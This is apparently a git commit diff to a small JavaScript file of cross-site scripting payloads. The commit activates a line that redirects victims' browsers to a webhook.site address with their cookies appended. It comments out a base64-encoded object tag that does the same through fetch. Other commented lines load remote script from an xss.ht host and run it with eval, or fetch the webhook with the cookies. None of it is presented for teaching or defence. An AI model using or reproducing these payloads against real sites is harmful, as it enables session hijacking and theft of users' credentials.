75a7eb95d4fd044d28e4e51c311db592bff37ea6
HotPlugin <57496383+hotplugin0x01@users.noreply.github.com>
2022-10-27 03:12:59 +0500

    Update x.js

--- x.js
+++ x.js
@@ -1,6 +1,6 @@
-// document.location='https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?'+document.cookie;
+document.location='https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?'+document.cookie;
 
-<object data="data:text/html;base64,ZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlL2Q3ZTU5MzQ5LWM2MWEtNDk4Yi05YzAwLTVmYWQ5N2E5ZTI5My8/Yz0iK2RvY3VtZW50LmNvb2tpZSk="></object>
+// <object data="data:text/html;base64,ZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlL2Q3ZTU5MzQ5LWM2MWEtNDk4Yi05YzAwLTVmYWQ5N2E5ZTI5My8/Yz0iK2RvY3VtZW50LmNvb2tpZSk="></object>
 
 // function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//hailxss.xss.ht");a.send();
 // fetch("https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?c="+document.cookie);
